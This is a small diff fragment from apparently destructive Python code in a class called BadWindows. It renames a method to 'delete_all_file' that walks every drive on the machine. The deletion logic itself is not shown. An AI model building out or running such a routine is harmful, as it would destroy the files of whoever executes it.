@@ -22,7 +22,7 @@ class BadWindows(object):
         except:
             return False
         
-    async def deltel_all_file(self) -> bool:        
+    async def delete_all_file(self) -> bool:        
         try:
             for drive in await self.get_drive():
                     os.chdir(f'{drive}:')
